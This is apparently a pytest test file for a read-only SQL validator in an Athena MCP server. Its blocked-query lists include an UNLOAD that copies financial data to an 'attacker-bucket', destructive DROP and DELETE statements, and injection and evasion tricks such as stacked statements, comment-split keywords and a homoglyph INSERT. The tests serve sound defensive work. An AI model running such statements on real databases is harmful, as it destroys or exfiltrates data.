# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Test the SQL validation module."""

import pytest
from awslabs.athena_mcp_server.validation import validate_query


class TestQueryValidation:
    """Test SQL query validation functionality."""

    @pytest.mark.parametrize(
        'query',
        [
            # Basic SELECT queries
            'SELECT * FROM users LIMIT 10',
            'SELECT name, email FROM customers WHERE id = 1',
            # Metadata queries
            'DESCRIBE users',
            'DESC table_name',
            'SHOW TABLES',
            'SHOW DATABASES',
            # EXPLAIN queries
            'EXPLAIN SELECT * FROM users',
            'EXPLAIN ANALYZE SELECT * FROM users',
            # Common Table Expressions (CTEs)
            'WITH cte AS (SELECT * FROM users) SELECT * FROM cte',
            # VALUES statements
            "VALUES (1, 'test'), (2, 'test2')",
            # UNION operations
            'SELECT * FROM users UNION SELECT * FROM customers',
            'SELECT id, name FROM table1 UNION ALL SELECT id, name FROM table2',
            '(SELECT col1 FROM table1) UNION (SELECT col1 FROM table2)',
            'SELECT 1 as num UNION SELECT 2 as num UNION SELECT 3 as num',
            # Subqueries
            'SELECT * FROM (SELECT * FROM users)',
            'SELECT * FROM (SELECT * FROM (SELECT * FROM users))',
            'SELECT * FROM users WHERE id IN (SELECT user_id FROM orders)',
            # JOIN operations
            'SELECT u.name, o.total FROM users u JOIN orders o ON u.id = o.user_id',
            'SELECT u.name, o.total FROM users u LEFT JOIN orders o ON u.id = o.user_id',
            'SELECT u.name, o.total FROM users u INNER JOIN orders o ON u.id = o.user_id',
            'SELECT u.name, o.total FROM users u RIGHT JOIN orders o ON u.id = o.user_id',
            # AS aliases
            'SELECT name AS username, email AS user_email FROM users',
            'SELECT * FROM (SELECT id, name FROM users) AS user_subset',
            'SELECT u.name AS username FROM users u',
            # CAST operations
            'SELECT CAST(price AS DECIMAL(10,2)) FROM products',
            'SELECT CAST(created_at AS DATE) FROM orders',
            'SELECT name, CAST(age AS VARCHAR) FROM users',
            # GROUP BY and aggregations
            'SELECT COUNT(*) FROM users GROUP BY department',
            'SELECT department, AVG(salary) FROM employees GROUP BY department',
            'SELECT status, COUNT(*) AS count FROM orders GROUP BY status HAVING COUNT(*) > 10',
            # CASE expressions
            "SELECT name, CASE WHEN age > 18 THEN 'adult' ELSE 'minor' END FROM users",
            "SELECT CASE status WHEN 'active' THEN 1 ELSE 0 END FROM users",
            # DISTINCT
            'SELECT DISTINCT department FROM employees',
            'SELECT DISTINCT status, priority FROM tickets',
            # BETWEEN
            'SELECT * FROM orders WHERE total BETWEEN 100 AND 500',
            "SELECT * FROM users WHERE created_at BETWEEN '2023-01-01' AND '2023-12-31'",
        ],
    )
    def test_read_only_queries_are_valid(self, query):
        """Test that read-only queries pass validation."""
        validate_query(query)

    @pytest.mark.parametrize(
        'query',
        [
            # DML
            "INSERT INTO users VALUES (1, 'test')",
            'INSERT /*+ arbitrary hint */ INTO "weird--table" ("select", "update") SELECT * FROM prod_src.metrics',
            "UPDATE users SET name = 'test' WHERE id = 1",
            'DELETE FROM users WHERE id = 1',
            'DELETE FROM iceberg_db.transactions WHERE TRUE',
            'MERGE INTO prod.dim_customer t USING staging.cust s ON (t.id=s.id) WHEN MATCHED THEN UPDATE SET name=s.name WHEN NOT MATCHED THEN INSERT (id,name) VALUES (s.id,s.name)',
            'TRUNCATE TABLE users',
            # DDL
            'CREATE TABLE test (id INT)',
            "CREATE TABLE IF NOT EXISTS tmp.ctas_test WITH (format='PARQUET') AS SELECT * FROM prod.sales LIMIT 10",
            'CREATE OR REPLACE VIEW secure_view AS SELECT * FROM sensitive.table',
            'DROP TABLE users',
            'DROP TABLE IF EXISTS archive.old_data',
            'ALTER TABLE users ADD COLUMN email VARCHAR(100)',
            'ALTER TABLE prod.important RENAME TO prod.important_old',
            "ALTER TABLE ice_db.orders ADD IF NOT EXISTS PARTITION (dt = '2025-06-24') LOCATION 's3://bucket/orders/2025/06/24/'",
            'CREATE DATABASE test_db',
            'DROP DATABASE test_db',
            # DML with UNION
            'INSERT INTO users SELECT * FROM temp UNION SELECT * FROM other',
            # CTE
            'SELECT * FROM (WITH hack AS (INSERT INTO users VALUES (1)) SELECT * FROM hack)',
            'SELECT * FROM (WITH hack AS (DELETE FROM users) SELECT 1)',
            'WITH staging AS (SELECT * FROM sampledb.elb_logs) INSERT INTO prod.logs SELECT * FROM staging',
            'WITH cte AS (SELECT * FROM users) INSERT INTO log SELECT * FROM cte',
            # DCL
            'GRANT SELECT ON users TO role1',
            # Configuration changes
            'SET hive.exec.dynamic.partition = true',
            'SET SESSION query_max_run_time = 60s',
            'SET SESSION hive.exec.dynamic.partition.mode = nonstrict',
            'USE database_name',
            # TCL
            'COMMIT',
            'ROLLBACK',
            # Data export/import
            "UNLOAD ( SELECT * FROM prod.financials LIMIT 100 ) TO 's3://attacker-bucket/loot/' WITH (format='PARQUET')",
            # Modern Trino/Iceberg commands
            "CALL iceberg.system.rewrite_data_files(table => 'iceberg_db.large_tbl')",
            'OPTIMIZE my_catalog.my_schema.my_tbl',
            'OPTIMIZE iceberg_db.fact_sales REWRITE DATA',
            'VACUUM iceberg_db.fact_sales',
            'MSCK REPAIR TABLE sampledb.newlogs',
            # EXPLAIN with mutations
            "EXPLAIN INSERT INTO users VALUES (1, 'test')",
            "EXPLAIN ANALYZE INSERT INTO users VALUES (1, 'test')",
        ],
    )
    def test_non_read_only_queries_are_invalid(self, query):
        """Test that non-read-only queries are blocked."""
        with pytest.raises(ValueError, match='not permitted'):
            validate_query(query)

    @pytest.mark.parametrize('query', ['', '   ', '\n\t  '])
    def test_empty_queries(self, query):
        """Test that empty queries are rejected."""
        with pytest.raises(ValueError, match='Query cannot be empty'):
            validate_query(query)

    @pytest.mark.parametrize(
        'query',
        [
            'SELECT * FROM',  # Incomplete query
            'SELEC * FROM users',  # Typo
            'SELECT * FROM users WHERE',  # Incomplete WHERE
            "WITH noop AS (SELECT 1), _x AS ( CALL system$set_session('foo','bar') ) SELECT * FROM noop",
            'IN/*hidden*/SERT INTO prod.audit(id) VALUES (1)',
            'ΙNSERT INTO prod.tricky VALUES (1)',  # Unicode homoglyph: Greek Ι (iota) looks like Latin I
            'EXPLAIN (TYPE IO) INSERT INTO analytics.hits SELECT * FROM raw.hits WHERE year = 2025',
        ],
    )
    def test_invalid_sql_syntax(self, query):
        """Test that invalid SQL syntax is caught."""
        with pytest.raises(ValueError, match='SQL parse error'):
            validate_query(query)

    @pytest.mark.parametrize(
        'query',
        [
            'SELECT * FROM users; SELECT * FROM orders',
            'SELECT 1; SELECT 2; SELECT 3',
            "INSERT INTO log VALUES (1, 'test'); SELECT * FROM log",
            'DESCRIBE users; SHOW TABLES',
            'EXPLAIN SELECT * FROM users; SELECT * FROM orders',
            'EXPLAIN ANALYZE SELECT 1; SELECT 2',
            'SELECT 1; INSERT INTO prod.secret_log VALUES (42)',
            'SELECT * FROM foo; DELETE FROM foo WHERE TRUE',
            "SELECT ';DROP TABLE prod.users' AS harmless; INSERT INTO log VALUES (now())",
            'CREATE VIEW sneaky AS SELECT * FROM prod.tiny; GRANT ALL ON prod.tiny TO PUBLIC',
        ],
    )
    def test_multiple_statements_rejected(self, query):
        """Test that multiple SQL statements are rejected due to statement count validation."""
        with pytest.raises(ValueError, match='Expected exactly one SQL statement'):
            validate_query(query)

    @pytest.mark.parametrize('query', ['EXPLAIN', 'EXPLAIN '])
    def test_incomplete_explain_statements(self, query):
        """Test that incomplete EXPLAIN statements are rejected."""
        with pytest.raises(ValueError, match='Incomplete EXPLAIN statement'):
            validate_query(query)
